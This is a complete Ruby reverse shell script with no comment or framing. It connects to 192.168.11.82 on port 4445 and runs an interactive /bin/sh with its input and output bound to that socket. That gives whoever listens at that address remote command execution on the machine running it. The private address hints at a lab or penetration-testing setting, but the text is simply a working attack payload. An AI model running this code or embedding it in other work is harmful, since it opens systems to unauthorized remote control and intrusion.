require 'socket'

f = TCPSocket.open("192.168.11.82",4445).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
